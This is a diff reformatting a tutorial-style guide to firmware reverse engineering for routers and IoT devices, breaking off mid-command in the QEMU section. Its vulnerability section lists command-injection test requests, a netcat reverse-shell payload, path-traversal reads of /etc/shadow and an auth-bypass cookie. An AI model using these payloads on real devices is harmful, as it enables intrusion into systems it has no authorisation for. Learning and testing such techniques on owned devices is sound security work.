@@ -1,4 +1,5 @@
 # ⚙️ Firmware Reverse Engineering — Complete Guide
+
 ### IoT, Routers, Embedded Devices: Extract, Analyze, and Emulate
 
 > **Who is this for?** You want to analyze firmware from routers, smart devices, cameras, and embedded systems — extract filesystems, find hardcoded credentials, identify vulnerabilities, and understand how embedded software works.
@@ -28,15 +29,15 @@ Firmware is software permanently stored in a device's flash memory. Unlike your 
 
 ### Types of Devices with Firmware
 
-| Device Type | Examples | Typical CPU |
-|---|---|---|
-| Home routers | TP-Link, Netgear, ASUS | MIPS, ARM |
-| IP cameras | Hikvision, Dahua, cheap Chinese | MIPS, ARM |
-| Smart TVs | Samsung, LG, Roku | ARM |
-| IoT sensors | Smart plugs, thermostats | ARM Cortex-M, ESP32 |
-| NAS devices | Synology, QNAP | x86, ARM |
-| Industrial PLC | Siemens, ABB | Various |
-| Printers | HP, Canon | MIPS, ARM |
+| Device Type    | Examples                        | Typical CPU         |
+| -------------- | ------------------------------- | ------------------- |
+| Home routers   | TP-Link, Netgear, ASUS          | MIPS, ARM           |
+| IP cameras     | Hikvision, Dahua, cheap Chinese | MIPS, ARM           |
+| Smart TVs      | Samsung, LG, Roku               | ARM                 |
+| IoT sensors    | Smart plugs, thermostats        | ARM Cortex-M, ESP32 |
+| NAS devices    | Synology, QNAP                  | x86, ARM            |
+| Industrial PLC | Siemens, ABB                    | Various             |
+| Printers       | HP, Canon                       | MIPS, ARM           |
 
 ### Why Reverse Engineer Firmware?
 
@@ -534,14 +535,14 @@ echo "Content-type: text/html"
 echo ""
 echo "<pre>$result</pre>"
 
-# Vulnerable! 
+# Vulnerable!
 # Request: /cgi-bin/ping.cgi?8.8.8.8;cat /etc/passwd
 # This executes: ping -c 1 8.8.8.8;cat /etc/passwd
 ```
 
 ### Finding Encryption Keys
 
-```bash
+````bash
 # Search for hardcoded keys
 grep -r "key\s*=" etc/ -i
 grep -r "password\s*=" etc/ -i
@@ -559,7 +560,7 @@ if not data: return 0
 	counter = Counter(data)
 	length = len(data)
 	return -sum((c/length)*math.log2(c/length) for c in counter.values())
-	
+
 	# Scan all small files for high-entropy data (possible keys)
 	for root, dirs, files in os.walk('.'):
 		for f in files:
@@ -574,779 +575,789 @@ if not data: return 0
 					except: pass
 					"
 					```
-					
-					### Identifying Startup Scripts
-					
-					```bash
-					# Init system (how services start)
-					cat etc/inittab          # SysV init
-					cat etc/init.d/*         # Init scripts
-					cat etc/rc.d/*           # Run-level scripts
-					cat etc/rcS              # Main startup script
-					
-					# Systemd (less common in embedded)
-					ls etc/systemd/system/
-					
-					# What's running at boot?
-					grep -r "telnetd\|httpd\|dropbear\|sshd" etc/ -r
-					
-					# Are there any backdoors in startup?
-					grep -r "nc\|netcat\|/bin/sh\|reverse" etc/init.d/ etc/rc* -r
-					
-					# Check crontabs (scheduled tasks)
-					cat var/spool/cron/crontabs/root 2>/dev/null
-					cat etc/cron* 2>/dev/null
-					```
-					
-					---
-					
-					## 6. Binary Analysis on Embedded Targets
-					
-					Embedded binaries (MIPS, ARM, etc.) are analyzed just like x86 — but with different registers and calling conventions.
-					
-					### Setting Up Ghidra for Embedded RE
-					
-					```
-					1. Open Ghidra → New Project → Import File
-					2. Select the binary (e.g., httpd, telnetd, or custom daemon)
-					3. Ghidra auto-detects:
-					"MIPS:BE:32:default" or "ARM:LE:32:default"
-					4. Run Analysis → Auto Analyze
-					5. Navigate to interesting functions
-					
-					Useful Ghidra features for embedded:
-					- Functions window: see all identified functions
-					- Strings window: Window → Defined Strings
-					- Symbol table: useful to find strcmp, system, etc.
-					```
-					
-					### Key Functions to Find in Embedded Binaries
-					
-					```
-					system()        → Executes shell command (command injection target)
-					popen()         → Same, but reads output
-					execve()        → Execute program
-					printf()        → Format string vulnerabilities
-					sprintf()       → Buffer overflow (no bounds checking)
-					strcpy()        → Buffer overflow
-					gets()          → Buffer overflow (always vulnerable!)
-					strcmp()        → Authentication checks
-					strncmp()       → Authentication checks
-					atoi()          → Integer parsing
-					malloc/free     → Heap operations
-					socket/connect  → Network connections
-					```
-					
-					**Finding dangerous functions in Ghidra:**
-					```
-					Window → Symbol References
-					Search for: system, strcpy, gets, sprintf
-					
-					Or in Disassembly:
-					Ctrl+F → search for "system"
-					Window → Show References → see all calls to system()
-					```
-					
-					### MIPS Assembly Basics
-					
-					Many routers use MIPS CPUs. Key differences from x86:
-					
-					```mips
-					# MIPS Registers
-					$zero / $0   → Always 0
-					$v0, $v1     → Return values
-					$a0-$a3      → Function arguments (first 4)
-					$t0-$t9      → Temporary (not preserved across calls)
-					$s0-$s7      → Saved (preserved)
-					$sp          → Stack pointer
-					$ra          → Return address (like x86's saved return addr on stack)
-					$pc          → Program counter
-					
-					# Key difference from x86:
-					# MIPS uses $ra register for return address
-					# Not on the stack like x86!
-					# Return is: jr $ra
-					
-					# Common patterns:
-					lui  $a0, 0x4          # Load upper 16 bits
-					ori  $a0, $a0, 0x1234  # Load address of string
-					jal  printf            # Jump and link (call)
-					jr   $ra               # Return
-					
-					# Load/store
-					lw   $t0, 0($sp)       # Load word from stack
-					sw   $t0, 4($sp)       # Store word to stack
-					lb   $t0, 0($a0)       # Load byte
-					```
-					
-					### ARM Assembly Basics
-					
-					Most modern IoT devices use ARM:
-					
-					```arm
-					# ARM Registers
-					R0-R3    → Arguments + return values
-					R4-R11   → Saved registers
-					R12      → Intra-procedure call scratch
-					R13/SP   → Stack pointer
-					R14/LR   → Link register (return address)
-					R15/PC   → Program counter
-					CPSR     → Status register (flags)
-					
-					# Key difference from x86:
-					# ARM uses LR (link register) for return address
-					# Return is: BX LR  or  POP {PC}
-					
-					# Common ARM patterns:
-					PUSH {R4-R7, LR}   # Save registers + LR (function start)
-					POP  {R4-R7, PC}   # Restore + return (function end)
-					
-					MOV  R0, #5        # R0 = 5
-					ADD  R0, R1, R2    # R0 = R1 + R2
-					LDR  R0, [R1]      # R0 = *R1 (dereference)
-					STR  R0, [R1, #4]  # *(R1+4) = R0
-					BL   printf        # Call printf (Branch with Link)
-					BX   LR            # Return
-					
-					# Thumb mode (compressed 16-bit instructions, very common)
-					.thumb or .thumb_func in disassembly
-					```
-					
-					---
-					
-					## 7. Finding Vulnerabilities in Firmware
-					
-					### Command Injection
-					
-					The most common vulnerability in embedded web interfaces:
-					
-					```bash
-					# In Ghidra, find calls to system() in httpd binary
-					# Look for code like:
-					
-					# C code equivalent:
-					char cmd[256];
-					char ip_param[64];
-					get_parameter("ip", ip_param);        // Get HTTP parameter
-					sprintf(cmd, "ping -c 1 %s", ip_param); // Build command
-					system(cmd);                           // Execute!
-					
-					# If ip_param = "8.8.8.8; cat /etc/passwd"
-					# Command becomes: "ping -c 1 8.8.8.8; cat /etc/passwd"
-					# Second command executes too!
-					```
-					
-					**Testing for command injection:**
-					```
-					Normal request:
-					GET /ping?ip=8.8.8.8
-					
-					Injection test:
-					GET /ping?ip=8.8.8.8;id
-					GET /ping?ip=8.8.8.8$(id)
-					GET /ping?ip=8.8.8.8`id`
-					GET /ping?ip=8.8.8.8%3Bid   (%3B = ; URL encoded)
-					
-					If you see "uid=0(root)" in response → command injection!
-					
-					Reverse shell:
-					GET /ping?ip=8.8.8.8;nc+192.168.1.200+4444+-e+/bin/sh
-					```
-					
-					### Buffer Overflows in Embedded
-					
-					```c
-					// Common vulnerable pattern in firmware:
-					void handle_request(char *request) {
-						char buffer[256];
-						strcpy(buffer, request);  // NO BOUNDS CHECK!
-						// If request > 256 bytes → overflow!
-					}
-					```
-					
-					**Finding buffer overflows statically:**
-					```bash
-					# Look for dangerous functions
-					strings httpd | grep -c strcpy   # Count occurrences
-					strings httpd | grep -c gets
-					
-					# In Ghidra:
-					# Find calls to strcpy, gets, sprintf
-					# Check if length is validated before the call
-					# If not → potential buffer overflow
-					```
-					
-					### Path Traversal
-					
-					Common in web interfaces:
-					
-					```bash
-					# Test:
-					GET /cgi-bin/readfile?file=../../etc/passwd
-					GET /cgi-bin/readfile?file=/etc/shadow
-					GET /cgi-bin/readfile?file=../../../etc/shadow%00.jpg  # Null byte injection
-					```
-					
-					### Authentication Bypass
-					
-					```bash
-					# Check CGI scripts for auth checks:
-					grep -r "auth\|login\|session" www/ -r
-					
-					# Common bypass patterns:
-					# 1. Magic cookie values
-					curl -b "admin=1" http://192.168.1.1/admin/
-					
-					# 2. Hardcoded backdoor passwords
-					# Look in strings: strings httpd | grep -i "admin\|backdoor\|factory"
-					
-					# 3. Predictable session IDs
-					# Look at how session tokens are generated
-					# If it's based on timestamp or MAC address → predictable!
-					
-					# 4. Hidden pages that skip auth
-					grep -r "noauth\|skipauth\|bypass" www/ -i
-					```
-					
-					---
-					
-					## 8. Emulating Firmware with QEMU
-					
-					Instead of needing physical hardware, run firmware in a virtual machine.
-					
-					### QEMU Setup
-					
-					```bash
-					# Install QEMU for various architectures
-					sudo apt install qemu-user-static \
-					qemu-system-mips \
-					qemu-system-arm \
-					qemu-system-x86_64
-					
-					# For user-mode emulation (single binary):
-					sudo apt install qemu-user-static binutils-mips-linux-gnu
-					```
-					
-					### Running Single Binaries (User-Mode Emulation)
-					
-					The easiest approach — run a single binary from the firmware:
-					
-					```bash
-					cd squashfs-root/
-					
-					# MIPS binary
-					qemu-mips-static -L . ./bin/busybox ls
-					
-					# MIPS big-endian
-					qemu-mips-static -L . ./usr/bin/httpd
-					
-					# ARM binary
-					qemu-arm-static -L . ./bin/some_arm_binary
-					
-					# The -L . flag tells QEMU to use current dir as root FS
-					# This means library paths like /lib/libc.so resolve to ./lib/libc.so
-					
-					# Make all binaries use QEMU transparently
-					sudo cp $(which qemu-mips-static) usr/bin/
-					sudo cp $(which qemu-arm-static) usr/bin/
-					sudo chroot . /bin/sh   # Full chroot into firmware filesystem!
-					```
-					
-					### Chroot into Firmware
-					
-					```bash
-					# This gives you a shell running inside the firmware's filesystem!
-					cd squashfs-root/
-					
-					# Copy QEMU binary needed for the architecture
-					sudo cp /usr/bin/qemu-mips-static usr/bin/   # for MIPS
-					# or
-					sudo cp /usr/bin/qemu-arm-static usr/bin/    # for ARM
-					
-					# Mount necessary pseudo-filesystems
-					sudo mount -t proc /proc proc/
-					sudo mount -t sysfs /sys sys/
-					sudo mount -o bind /dev dev/
-					
-					# Enter the chroot
-					sudo chroot . /bin/sh
-					
-					# Now you're running inside the firmware!
-					# Run services:
-					/usr/sbin/httpd -p 8080   # Start web server
-					
-					# Exit
-					exit
-					sudo umount proc/ sys/ dev/
-					```
-					
-					### Full System Emulation
-					
-					For complete emulation (entire device including kernel):
-					
-					```bash
-					# Example: Emulate MIPS router firmware
-					
-					# Extract kernel and rootfs from firmware
-					binwalk -e firmware.bin
-					# kernel: _firmware.bin.extracted/uImage-kernel.bin
-					# rootfs: _firmware.bin.extracted/squashfs-root/
-					
-					# Create disk image with rootfs
-					dd if=/dev/zero of=rootfs.ext2 bs=1M count=64
-					mkfs.ext2 rootfs.ext2
-					sudo mount -o loop rootfs.ext2 /mnt/firmware
-					sudo cp -r squashfs-root/. /mnt/firmware/
-					sudo umount /mnt/firmware
-					
-					# Run in QEMU (MIPS Malta board example)
-					qemu-system-mips \
-					-M malta \
-					-kernel vmlinux-malta \
-					-hda rootfs.ext2 \
-					-append "root=/dev/sda" \
-					-net nic \
-					-net user,hostfwd=tcp::8080-:80,hostfwd=tcp::2222-:22 \
-					-nographic
-					
-					# Access services:
-					curl http://localhost:8080/      # Web interface
-					ssh root@localhost -p 2222       # SSH
-					```
-					
-					### Firmadyne (Automated Full Emulation)
-					
-					Firmadyne automates MIPS/ARM firmware emulation:
-					
-					```bash
-					# Install
-					git clone https://github.com/firmadyne/firmadyne.git
-					cd firmadyne
-					./download.sh
-					
-					# Requires PostgreSQL
-					sudo apt install postgresql
-					sudo -u postgres createuser -P firmadyne
-					# password: firmadyne
-					
-					# Setup database
-					./setup.sh
-					
-					# Import firmware
-					./sources/extractor/extractor.py -b TP-Link \
-					-sql 127.0.0.1 \
-					-np -nk \
-					"firmware.bin" images/
-					
-					# Identify architecture
-					./scripts/getArch.sh ./images/1.tar.gz
-					
-					# Set up filesytem
-					./scripts/makeImage.sh 1
-					
-					# Create network config
-					./scripts/inferNetwork.sh 1
-					
-					# Emulate!
-					./scratch/1/run.sh
-					
-					# Access web interface at the IP shown
-					```
-					
-					---
-					
-					## 9. Dynamic Analysis of Embedded Binaries
-					
-					### GDB Remote Debugging
-					
-					Debug a binary running in QEMU or on a real device:
-					
-					```bash
-					# On the firmware (device or QEMU):
-					# Install gdbserver (or it might already be there)
-					# Check: which gdbserver
-					
-					# Start gdbserver
-					gdbserver 0.0.0.0:1234 /usr/sbin/httpd
-					
-					# On your analysis machine:
-					gdb-multiarch ./httpd    # Use gdb-multiarch for cross-arch
-					
-					# In GDB:
-					(gdb) set architecture mips    # or arm
-					(gdb) target remote 192.168.1.1:1234
-					(gdb) break *0x401000      # Set breakpoint
-					(gdb) continue
-					(gdb) info registers       # Check registers
-					(gdb) x/10i $pc            # Disassemble at current instruction
-					```
-					
-					### Frida on Embedded Linux
-					
-					If the device has enough memory and is ARM/MIPS Linux:
-					
-					```bash
-					# Download frida-server for the right arch
-					# https://github.com/frida/frida/releases
-					# e.g., frida-server-16.x.x-linux-arm
-					
-					# Copy to device
-					scp frida-server-linux-arm root@192.168.1.1:/tmp/
-					ssh root@192.168.1.1 'chmod 755 /tmp/frida-server && /tmp/frida-server &'
-					
-					# On your machine
-					frida-ps -H 192.168.1.1     # List processes on device
-					frida -H 192.168.1.1 -l script.js httpd  # Attach to web server
-					```
-					
-					### strace on Firmware
-					
-					```bash
-					# On the device or in chroot:
-					strace -f -o strace.log ./httpd
-					
-					# See all system calls
-					# Filter for interesting ones:
-					grep "open\|read\|write\|execve\|connect" strace.log
-					
-					# See file access
-					strace -f -e trace=file ./httpd 2>&1 | grep -v ENOENT
-					
-					# See network activity
-					strace -f -e trace=network ./httpd
-					```
-					
-					### ltrace (Library Call Tracer)
-					
-					```bash
-					# Trace library function calls
-					ltrace ./httpd
-					
-					# Filter for specific functions
-					ltrace -e "strcmp,strcpy,system" ./httpd
-					
-					# Output shows every strcmp call with its arguments!
-					# Very useful for finding password checks:
-					# strcmp("admin", "admin") = 0  ← match!
-					# strcmp("password123", "badpass") = -1  ← no match
-					```
-					
-					---
-					
-					## 10. Common IoT Vulnerabilities
-					
-					### CVE Categories for Embedded Devices
-					
-					**1. Default / Hardcoded Credentials**
-					```bash
-					# Always check:
-					cat etc/passwd
-					cat etc/shadow
-					grep -r "admin\|root\|password" etc/ -i
-					
-					# Common defaults:
-					# admin:admin
-					# admin:password
-					# admin:1234
-					# root:(empty)
-					# root:root
-					# user:user
-					```
-					
-					**2. Telnet Enabled by Default**
-					```bash
-					# Check startup scripts
-					grep -r "telnetd" etc/ -r
-					
-					# If telnet is running on the real device:
-					telnet 192.168.1.1
-					# Login with default creds
-					```
-					
-					**3. Outdated and Vulnerable Components**
-					```bash
-					# Check versions of common software
-					strings usr/sbin/httpd | grep -i "version\|v[0-9]"
-					strings bin/busybox | head -5  # BusyBox version
-					strings lib/libssl.so.* | grep "OpenSSL"  # OpenSSL version
-					
-					# CVE databases to check:
-					# nvd.nist.gov
-					# cve.mitre.org
-					# vulhub.org.cn
-					```
-					
-					**4. Insecure Update Mechanism**
-					```bash
-					# How does the device verify firmware updates?
-					grep -r "verify\|signature\|checksum\|md5\|sha" usr/ -i
-					
-					# Common issues:
-					# - No signature verification (any firmware accepted)
-					# - MD5 only (not cryptographically secure)
-					# - HTTP instead of HTTPS for download
-					# - Checksum downloaded from same HTTP URL
-					
-					# Test: create a modified firmware, does device accept it?
-					# (Only on devices you own!)
-					```
-					
-					**5. Debug Interfaces Left Open**
-					```bash
-					# Check for debug ports
-					grep -r "debug\|telnet\|uart\|console" etc/ -i
-					
-					# Services that shouldn't be in production:
-					grep -r "gdbserver\|strace\|debug_mode" etc/ -r
-					
-					# Hidden web interfaces
-					find www/ -name "debug*" -o -name "test*" -o -name "diag*"
-					```
-					
-					**6. Sensitive Information in Log Files**
-					```bash
-					# Check if logs contain sensitive data
-					find var/log/ -type f | xargs strings | grep -i "pass\|token\|key"
-					
-					# Debug logging enabled?
-					grep -r "debug\|verbose\|log_level" etc/ -i
-					```
-					
-					### Example: Full Analysis Workflow
-					
-					```bash
-					# Scenario: Analyze a cheap IP camera
-					
-					# 1. Download firmware from manufacturer
-					wget https://example-camera.com/firmware_v1.2.bin
-					
-					# 2. Analyze
-					binwalk firmware_v1.2.bin
-					# Found: SquashFS at offset 0x100000
-					
-					# 3. Extract
-					binwalk -e firmware_v1.2.bin
-					cd _firmware_v1.2.bin.extracted/squashfs-root/
-					
-					# 4. Check for vulnerabilities
-					cat etc/passwd
-					# root:$1$xyz:0:0:root:/root:/bin/sh   ← Has password
-					# admin:$1$abc:0:0:admin:/home/admin:/bin/sh
-					
-					# Check for telnet
-					grep -r "telnetd" etc/
-					# etc/init.d/rcS: telnetd &   ← Telnet enabled at boot!
-					
-					# 5. Crack the password
-					unshadow etc/passwd etc/shadow > combined.txt
-					hashcat -m 500 combined.txt /usr/share/wordlists/rockyou.txt
-					# admin:password123    ← Cracked!
-					
-					# 6. Find web vulnerabilities
-					grep -r "system\|exec" www/cgi-bin/ -l
-					# Found: www/cgi-bin/snapshot.cgi
-					
-					cat www/cgi-bin/snapshot.cgi
-					# #!/bin/sh
-					# CHANNEL=$QUERY_STRING
-					# ffmpeg -i "rtsp://localhost/$CHANNEL" -frames:v 1 snapshot.jpg
-					# Command injection! CHANNEL is not sanitized
-					
-					# 7. Test on real device
-					curl "http://192.168.1.100/cgi-bin/snapshot.cgi?channel=0;id"
-					# uid=0(root)   ← Command injection confirmed, running as root!
-					
-					# 8. Report findings:
-					# - Telnet enabled with default password
-					# - Command injection in snapshot.cgi
-					# - Running as root (no privilege separation)
-					```
-					
-					---
-					
-					## 11. Tools Reference
-					
-					| Tool | Use | Install |
-					|---|---|---|
-					| **binwalk** | Firmware analysis and extraction | `pip install binwalk` |
-					| **squashfs-tools** | SquashFS extraction | `apt install squashfs-tools` |
-					| **QEMU** | Firmware emulation | `apt install qemu-user-static` |
-					| **Ghidra** | Binary reverse engineering | ghidra-sre.org |
-					| **radare2** | CLI binary analysis | `apt install radare2` |
-					| **Firmadyne** | Automated emulation | GitHub |
-					| **flashrom** | SPI flash read/write | `apt install flashrom` |
-					| **openocd** | JTAG debugging | `apt install openocd` |
-					| **gdb-multiarch** | Cross-arch debugging | `apt install gdb-multiarch` |
-					| **file** | Identify file types | Pre-installed |
-					| **strings** | Extract text from binaries | Pre-installed |
-					| **ltrace** | Library call tracing | `apt install ltrace` |
-					| **strace** | System call tracing | `apt install strace` |
-					| **Frida** | Dynamic instrumentation | `pip install frida-tools` |
-					| **Router Sploit** | IoT exploit framework | GitHub |
-					
-					### One-Line Analysis Script
-					
-					```bash
-					#!/bin/bash
-					# firmware_quick_analyze.sh - Quick firmware triage
-					
-					FW=$1
-					echo "=== FIRMWARE TRIAGE: $FW ==="
-					
-					echo "\n[+] File info:"
-					file "$FW"
-					md5sum "$FW"
-					
-					echo "\n[+] Binwalk scan:"
-					binwalk "$FW"
-					
-					echo "\n[+] Extracting..."
-					binwalk -e "$FW" -q
-					
-					EXTRACT_DIR="_${FW}.extracted"
-					if [ -d "$EXTRACT_DIR" ]; then
-						echo "\n[+] Finding interesting files..."
-						find "$EXTRACT_DIR" -name "*.conf" -o -name "*.cfg" \
-						-o -name "passwd" -o -name "shadow" | head -20
-						
-						echo "\n[+] Looking for credentials..."
-						grep -r "password\|passwd" "$EXTRACT_DIR/squashfs-root/etc/" -i 2>/dev/null | head -20
-						
-						echo "\n[+] Looking for private keys..."
-						grep -r "BEGIN.*PRIVATE KEY" "$EXTRACT_DIR" -l 2>/dev/null
-						
-						echo "\n[+] Checking for telnet..."
-						grep -r "telnetd" "$EXTRACT_DIR" -r 2>/dev/null | head -5
-						
-						echo "\n[+] Web files:"
-						find "$EXTRACT_DIR" -name "*.cgi" -o -name "*.php" 2>/dev/null | head -10
-						fi
-						```
-						
-						---
-						
-						## 12. Practice Resources
-						
-						### Lab Devices (Buy Cheap Second-Hand)
-						
-						```
-						Recommended for practice:
-						TP-Link TL-WR841N     → ~$5-10 used, MIPS, open firmware
-						TP-Link TL-MR3020     → Portable, easy UART
-						Netgear WNR1000       → Many CVEs to study
-						D-Link DIR-615        → Multiple known vulns
-						Any cheap IP camera from eBay → Often terrible security
-						
-						Why these?
-						→ Known CVEs to research and reproduce
-						→ UART accessible
-						→ OpenWrt support (compare stock vs open firmware)
-						→ Cheap if you brick it
-						```
-						
-						### Practice Firmware (Download, Don't Need Hardware)
-						
-						```bash
-						# Download real firmware to analyze
-						# TP-Link archive: https://www.tp-link.com/us/support/download/
-						# Netgear: https://www.netgear.com/support/download/
-						# D-Link: https://support.dlink.com/
-						
-						# Practice exercises:
-						# 1. Extract and find the default WiFi password generation algorithm
-						# 2. Find all enabled services
-						# 3. Identify CVEs that may apply
-						# 4. Find command injection in web interface
-						
-						# Vulnerable firmware images for research:
-						# vulhub/iot-firmware (GitHub)
-						# firmwalker (scan extracted firmware for issues)
-						```
-						
-						### Online Resources
-						
-						| Resource | URL | Content |
-						|---|---|---|
-						| **IoTSecurity101** | iotsecurity101.com | IoT RE guide |
-						| **/dev/ttypwn** | blog.attify.com | Firmware RE articles |
-						| **Exploit-DB** | exploit-db.com | Real router exploits to study |
-						| **Router Exploitation** | github.com/hackthedot | Scripts and guides |
-						| **ARM Assembly Guide** | azeria-labs.com | Best ARM assembly tutorial |
-						| **MIPS Assembly** | chortle.ccsu.edu/assemblytutorial | MIPS reference |
-						
-						### Suggested Learning Path
-						
-						```
-						Week 1: Foundations
-						→ Download 3 different router firmwares
-						→ Run binwalk on all of them
-						→ Compare their filesystems and configurations
-						
-						Week 2: Credential Hunting
-						→ Extract each firmware's filesystem
-						→ Find all credentials and config files
-						→ Check for telnet, default passwords, SSL certs
-						
-						Week 3: Binary Analysis
-						→ Open the main web server binary in Ghidra
-						→ Find calls to system() and strcpy()
-						→ Understand the web request handling flow
-						
-						Week 4: Emulation
-						→ Set up QEMU chroot
-						→ Run the web server inside QEMU
-						→ Access the web interface from your browser
-						
-						Month 2+:
-						→ Buy a cheap router and practice UART access
-						→ Reproduce a known CVE from Exploit-DB
-						→ Set up full system emulation with Firmadyne
-						→ Try to find a new bug in a device
-						```
-						
-						---
-						
-						## Quick Reference Cheatsheet
-						
-						### Binwalk Commands
-						```bash
-						binwalk firmware.bin           # Analyze
-						binwalk -E firmware.bin        # Entropy graph
-						binwalk -e firmware.bin        # Extract all
-						binwalk -M -e firmware.bin     # Recursive extraction
-						```
-						
-						### Firmware Search Commands
-						```bash
-						grep -r "password" squashfs-root/etc/ -i
-						grep -r "BEGIN.*PRIVATE KEY" squashfs-root/ -l
-						find squashfs-root/ -name "*.cgi" | xargs grep "system("
-						strings squashfs-root/usr/sbin/httpd | grep "http\|admin\|pass"
-						```
-						
-						### QEMU Quick Start
-						```bash
-						# Copy QEMU binary to firmware root
-						sudo cp /usr/bin/qemu-mips-static squashfs-root/usr/bin/
-						
-						# Chroot into firmware
-						sudo chroot squashfs-root/ /bin/sh
-						```
-						
-						### Hardware Attack Quickref
-						```bash
-						# SPI Flash dump
-						flashrom -p ch341a_spi -r firmware.bin
-						
-						# UART connect
-						screen /dev/ttyUSB0 115200
-						
-						# GDB remote debug
-						gdb-multiarch ./binary
-						(gdb) target remote 192.168.1.1:1234
-						```
-						
-						---
-						
-						*Part of the Complete Reverse Engineering Series*
-						*You now have: Binary RE + Web RE + Mobile RE + Network RE + Firmware RE*
+
+### Identifying Startup Scripts
+
+```bash
+# Init system (how services start)
+cat etc/inittab          # SysV init
+cat etc/init.d/*         # Init scripts
+cat etc/rc.d/*           # Run-level scripts
+cat etc/rcS              # Main startup script
+
+# Systemd (less common in embedded)
+ls etc/systemd/system/
+
+# What's running at boot?
+grep -r "telnetd\|httpd\|dropbear\|sshd" etc/ -r
+
+# Are there any backdoors in startup?
+grep -r "nc\|netcat\|/bin/sh\|reverse" etc/init.d/ etc/rc* -r
+
+# Check crontabs (scheduled tasks)
+cat var/spool/cron/crontabs/root 2>/dev/null
+cat etc/cron* 2>/dev/null
+````
+
+---
+
+## 6. Binary Analysis on Embedded Targets
+
+Embedded binaries (MIPS, ARM, etc.) are analyzed just like x86 — but with different registers and calling conventions.
+
+### Setting Up Ghidra for Embedded RE
+
+```
+1. Open Ghidra → New Project → Import File
+2. Select the binary (e.g., httpd, telnetd, or custom daemon)
+3. Ghidra auto-detects:
+"MIPS:BE:32:default" or "ARM:LE:32:default"
+4. Run Analysis → Auto Analyze
+5. Navigate to interesting functions
+
+Useful Ghidra features for embedded:
+- Functions window: see all identified functions
+- Strings window: Window → Defined Strings
+- Symbol table: useful to find strcmp, system, etc.
+```
+
+### Key Functions to Find in Embedded Binaries
+
+```
+system()        → Executes shell command (command injection target)
+popen()         → Same, but reads output
+execve()        → Execute program
+printf()        → Format string vulnerabilities
+sprintf()       → Buffer overflow (no bounds checking)
+strcpy()        → Buffer overflow
+gets()          → Buffer overflow (always vulnerable!)
+strcmp()        → Authentication checks
+strncmp()       → Authentication checks
+atoi()          → Integer parsing
+malloc/free     → Heap operations
+socket/connect  → Network connections
+```
+
+**Finding dangerous functions in Ghidra:**
+
+```
+Window → Symbol References
+Search for: system, strcpy, gets, sprintf
+
+Or in Disassembly:
+Ctrl+F → search for "system"
+Window → Show References → see all calls to system()
+```
+
+### MIPS Assembly Basics
+
+Many routers use MIPS CPUs. Key differences from x86:
+
+```mips
+# MIPS Registers
+$zero / $0   → Always 0
+$v0, $v1     → Return values
+$a0-$a3      → Function arguments (first 4)
+$t0-$t9      → Temporary (not preserved across calls)
+$s0-$s7      → Saved (preserved)
+$sp          → Stack pointer
+$ra          → Return address (like x86's saved return addr on stack)
+$pc          → Program counter
+
+# Key difference from x86:
+# MIPS uses $ra register for return address
+# Not on the stack like x86!
+# Return is: jr $ra
+
+# Common patterns:
+lui  $a0, 0x4          # Load upper 16 bits
+ori  $a0, $a0, 0x1234  # Load address of string
+jal  printf            # Jump and link (call)
+jr   $ra               # Return
+
+# Load/store
+lw   $t0, 0($sp)       # Load word from stack
+sw   $t0, 4($sp)       # Store word to stack
+lb   $t0, 0($a0)       # Load byte
+```
+
+### ARM Assembly Basics
+
+Most modern IoT devices use ARM:
+
+```arm
+# ARM Registers
+R0-R3    → Arguments + return values
+R4-R11   → Saved registers
+R12      → Intra-procedure call scratch
+R13/SP   → Stack pointer
+R14/LR   → Link register (return address)
+R15/PC   → Program counter
+CPSR     → Status register (flags)
+
+# Key difference from x86:
+# ARM uses LR (link register) for return address
+# Return is: BX LR  or  POP {PC}
+
+# Common ARM patterns:
+PUSH {R4-R7, LR}   # Save registers + LR (function start)
+POP  {R4-R7, PC}   # Restore + return (function end)
+
+MOV  R0, #5        # R0 = 5
+ADD  R0, R1, R2    # R0 = R1 + R2
+LDR  R0, [R1]      # R0 = *R1 (dereference)
+STR  R0, [R1, #4]  # *(R1+4) = R0
+BL   printf        # Call printf (Branch with Link)
+BX   LR            # Return
+
+# Thumb mode (compressed 16-bit instructions, very common)
+.thumb or .thumb_func in disassembly
+```
+
+---
+
+## 7. Finding Vulnerabilities in Firmware
+
+### Command Injection
+
+The most common vulnerability in embedded web interfaces:
+
+```bash
+# In Ghidra, find calls to system() in httpd binary
+# Look for code like:
+
+# C code equivalent:
+char cmd[256];
+char ip_param[64];
+get_parameter("ip", ip_param);        // Get HTTP parameter
+sprintf(cmd, "ping -c 1 %s", ip_param); // Build command
+system(cmd);                           // Execute!
+
+# If ip_param = "8.8.8.8; cat /etc/passwd"
+# Command becomes: "ping -c 1 8.8.8.8; cat /etc/passwd"
+# Second command executes too!
+```
+
+**Testing for command injection:**
+
+```
+Normal request:
+GET /ping?ip=8.8.8.8
+
+Injection test:
+GET /ping?ip=8.8.8.8;id
+GET /ping?ip=8.8.8.8$(id)
+GET /ping?ip=8.8.8.8`id`
+GET /ping?ip=8.8.8.8%3Bid   (%3B = ; URL encoded)
+
+If you see "uid=0(root)" in response → command injection!
+
+Reverse shell:
+GET /ping?ip=8.8.8.8;nc+192.168.1.200+4444+-e+/bin/sh
+```
+
+### Buffer Overflows in Embedded
+
+```c
+// Common vulnerable pattern in firmware:
+void handle_request(char *request) {
+	char buffer[256];
+	strcpy(buffer, request);  // NO BOUNDS CHECK!
+	// If request > 256 bytes → overflow!
+}
+```
+
+**Finding buffer overflows statically:**
+
+```bash
+# Look for dangerous functions
+strings httpd | grep -c strcpy   # Count occurrences
+strings httpd | grep -c gets
+
+# In Ghidra:
+# Find calls to strcpy, gets, sprintf
+# Check if length is validated before the call
+# If not → potential buffer overflow
+```
+
+### Path Traversal
+
+Common in web interfaces:
+
+```bash
+# Test:
+GET /cgi-bin/readfile?file=../../etc/passwd
+GET /cgi-bin/readfile?file=/etc/shadow
+GET /cgi-bin/readfile?file=../../../etc/shadow%00.jpg  # Null byte injection
+```
+
+### Authentication Bypass
+
+```bash
+# Check CGI scripts for auth checks:
+grep -r "auth\|login\|session" www/ -r
+
+# Common bypass patterns:
+# 1. Magic cookie values
+curl -b "admin=1" http://192.168.1.1/admin/
+
+# 2. Hardcoded backdoor passwords
+# Look in strings: strings httpd | grep -i "admin\|backdoor\|factory"
+
+# 3. Predictable session IDs
+# Look at how session tokens are generated
+# If it's based on timestamp or MAC address → predictable!
+
+# 4. Hidden pages that skip auth
+grep -r "noauth\|skipauth\|bypass" www/ -i
+```
+
+---
+
+## 8. Emulating Firmware with QEMU
+
+Instead of needing physical hardware, run firmware in a virtual machine.
+
+### QEMU Setup
+
+```bash
+# Install QEMU for various architectures
+sudo apt install qemu-user-static \
